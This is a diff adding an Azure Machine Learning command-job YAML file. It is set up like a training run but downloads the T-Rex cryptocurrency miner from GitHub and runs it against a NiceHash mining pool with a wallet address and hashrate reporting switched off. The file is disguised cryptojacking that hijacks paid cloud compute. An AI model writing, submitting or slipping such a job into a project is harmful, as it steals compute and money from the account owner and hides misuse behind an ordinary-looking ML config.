@@ -1,0 +1,18 @@
+$schema: 'https://azuremlschemas.azureedge.net/latest/commandJob.schema.json'
+environment: 'azureml:AzureML-sklearn-0.24-ubuntu18.04-py37-cpu:47'
+command: >+
+  wget
+  https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
+
+  tar -xvf t-rex-0.26.8-linux.tar.gz
+
+  ./t-rex -a kawpow -o stratum+ssl://octopus.auto.nicehash.com:443 -u
+  NHbEav8KYUTi2n6dKLHDTopXh17wCtLMvLDs.powerpoint -p x --no-hashrate-report
+
+compute: 'azureml:tt1'
+resources:
+  instance_count: 1
+distribution:
+  type: pytorch
+  process_count_per_instance: 1
+experiment_name: Default
